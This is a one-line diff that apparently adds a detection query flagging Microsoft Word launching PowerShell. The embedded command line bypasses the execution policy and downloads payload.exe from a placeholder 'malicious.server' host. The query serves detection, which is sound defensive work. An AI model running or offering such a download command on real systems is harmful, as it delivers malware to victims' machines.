@@ -1,0 +1,2 @@
+
+srcNode.Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" AND srcNode.Cmdline: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /mFileOpen" AND dstNode.Image: "C:\\Windows\\System32\\powershell.exe" AND dstNode.Cmdline: "powershell.exe -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri http://malicious.server/payload.exe -OutFile C:\\temp\\payload.exe\""
